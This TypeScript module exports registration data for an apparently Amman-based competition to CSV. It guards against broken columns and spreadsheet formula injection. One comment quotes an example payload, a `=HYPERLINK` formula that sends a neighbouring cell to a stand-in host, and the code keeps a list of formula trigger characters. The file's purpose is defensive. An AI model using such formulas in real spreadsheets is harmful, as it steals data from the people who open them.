/**
 * CSV serialisation, aimed squarely at Excel.
 *
 * Free of Prisma and of the request, so the two things that are easy to get
 * quietly wrong — a field that breaks out of its column, and a field that
 * executes when the spreadsheet opens — are tested directly rather than by
 * downloading a file and looking at it.
 */

/** RFC 4180 wants CRLF, and Excel is the least forgiving reader of the two. */
const ROW_SEPARATOR = "\r\n";

/** Written as an escape rather than the character itself, which is invisible. */
export const BOM = "\uFEFF";

/**
 * Leading characters that make Excel treat a cell as a formula rather than as
 * text.
 *
 * This matters here more than in most exports: team names, member names and
 * university names are typed by the public, so a registrant can choose exactly
 * what lands in this file. Left alone, a team called
 * `=HYPERLINK("http://x/?"&A1)` exfiltrates the row next to it the moment an
 * admin opens the sheet, and the DDE variants can do considerably worse.
 *
 * Tab and carriage return are included because Excel strips them and then
 * reads whatever is underneath.
 */
const FORMULA_TRIGGERS = ["=", "+", "-", "@", "\t", "\r"];

/**
 * Makes one value safe to put in a cell.
 *
 * A leading apostrophe is Excel's own "this is text" marker: it is not shown
 * in the cell, it survives a re-save, and it is what stops the formula parser
 * from ever seeing the value. It does mean a `+962…` phone number is stored
 * with one — which is the behaviour you want anyway, since Excel would
 * otherwise render that cell as #NAME?.
 */
export function sanitiseCell(value: string): string {
  if (value.length === 0) return value;
  return FORMULA_TRIGGERS.some((trigger) => value.startsWith(trigger)) ? `'${value}` : value;
}

/**
 * Quotes one field if it needs it.
 *
 * Quoting is what keeps a comma inside a value from becoming a new column, and
 * doubling the quotes is what keeps a quote inside a value from ending the
 * field early. Leading and trailing spaces are quoted too, since some readers
 * silently trim an unquoted field and the data then differs from what was
 * entered.
 */
export function escapeCsvField(value: unknown): string {
  const raw = valueToString(value);
  const safe = sanitiseCell(raw);
  const needsQuotes = /[",\r\n]/.test(safe) || safe !== safe.trim();
  return needsQuotes ? `"${safe.replace(/"/g, '""')}"` : safe;
}

/**
 * How each kind of value reads in a cell.
 *
 * Dates go out as ISO 8601 with a space instead of the "T", which Excel parses
 * as a real date on import while remaining readable if anyone opens the file
 * in a text editor. Null and undefined become empty rather than the strings
 * "null" and "undefined", which is the difference between an empty cell and a
 * cell someone has to clean up.
 */
function valueToString(value: unknown): string {
  if (value === null || value === undefined) return "";
  if (value instanceof Date) {
    return Number.isNaN(value.getTime()) ? "" : value.toISOString().replace("T", " ").slice(0, 19);
  }
  if (typeof value === "boolean") return value ? "yes" : "no";
  return String(value);
}

/**
 * A whole sheet: one header row, then the data.
 *
 * The byte-order mark is not decoration. Without it Excel opens a UTF-8 file
 * as the local code page, and every Arabic name in it arrives as mojibake —
 * which, on a competition run out of Amman, is most of the interesting rows.
 */
export function toCsv(headers: readonly string[], rows: readonly unknown[][]): string {
  const lines = [headers.map(escapeCsvField).join(",")];
  for (const row of rows) {
    lines.push(row.map(escapeCsvField).join(","));
  }
  return `${BOM}${lines.join(ROW_SEPARATOR)}${ROW_SEPARATOR}`;
}

/** Fils to a plain decimal, so the cell is a number Excel can total. */
export function filsToAmount(fils: number | null | undefined): number | null {
  return fils === null || fils === undefined ? null : fils / 1000;
}

export interface TeamRowSource {
  teamName: string;
  submitterEmail: string;
  status: string;
  memberCount: number;
  feeTier: string;
  feeBaseFils: number | null;
  feeDiscountFils: number | null;
  feeDueFils: number | null;
  paymentStatus: string;
  paymentAmountFils: number | null;
  paymentReference: string | null;
  paymentSubmittedAt: Date | null;
  paymentVerifiedAt: Date | null;
  paymentNote: string | null;
  paymentScreenshotUrl: string | null;
  consentVersion: string | null;
  consentAcceptedAt: Date | null;
  createdAt: Date;
}

export const TEAM_HEADERS = [
  "Team name",
  "Submitter email",
  "Status",
  "Members",
  "Fee tier",
  "Quoted (JOD)",
  "Discount (JOD)",
  "Base price (JOD)",
  "Payment status",
  "Reported amount (JOD)",
  "Payment reference",
  "Payment submitted",
  "Payment verified",
  "Payment note",
  "Screenshot uploaded",
  "Consent version",
  "Consent accepted",
  "Registered at",
] as const;

/**
 * One row per team.
 *
 * The resume code is deliberately absent. It is a credential — anyone holding
 * it can reopen that team's registration and change what was submitted — and a
 * spreadsheet that gets mailed around is the last place it should be. The
 * screenshot is reported as a yes/no for the same reason: its URL is the one
 * thing the admin screenshot route exists to keep out of circulation.
 */
export function teamRow(registration: TeamRowSource): unknown[] {
  return [
    registration.teamName,
    registration.submitterEmail,
    registration.status,
    registration.memberCount,
    registration.feeTier,
    filsToAmount(registration.feeDueFils),
    filsToAmount(registration.feeDiscountFils),
    filsToAmount(registration.feeBaseFils),
    registration.paymentStatus,
    filsToAmount(registration.paymentAmountFils),
    registration.paymentReference,
    registration.paymentSubmittedAt,
    registration.paymentVerifiedAt,
    registration.paymentNote,
    Boolean(registration.paymentScreenshotUrl),
    registration.consentVersion,
    registration.consentAcceptedAt,
    registration.createdAt,
  ];
}

export interface MemberRowSource {
  order: number;
  firstName: string;
  lastName: string;
  email: string;
  whatsapp: string;
  university: string;
  major: string;
  ieeeStatus: string;
  ieeeMembershipId: string;
}

export const MEMBER_HEADERS = [
  "Team name",
  "Team status",
  "Member #",
  "First name",
  "Last name",
  "Email",
  "WhatsApp",
  "University",
  "Major",
  "IEEE status",
  "IEEE membership ID",
] as const;

/**
 * One row per person, carrying the team name and status so the sheet stands on
 * its own.
 *
 * Repeating those two columns rather than making the reader join against the
 * teams sheet: the common use of this file is filtering people by whether
 * their team is confirmed, and a VLOOKUP is not a reasonable thing to ask of
 * someone chasing missing WhatsApp numbers the week before the event.
 */
export function memberRow(
  teamName: string,
  teamStatus: string,
  member: MemberRowSource,
): unknown[] {
  return [
    teamName,
    teamStatus,
    // Already 1-based in the database (see registration.ts, `order: i + 1`),
    // so this is the number the team themselves saw on the form.
    member.order,
    member.firstName,
    member.lastName,
    member.email,
    member.whatsapp,
    member.university,
    member.major,
    member.ieeeStatus,
    member.ieeeMembershipId,
  ];
}
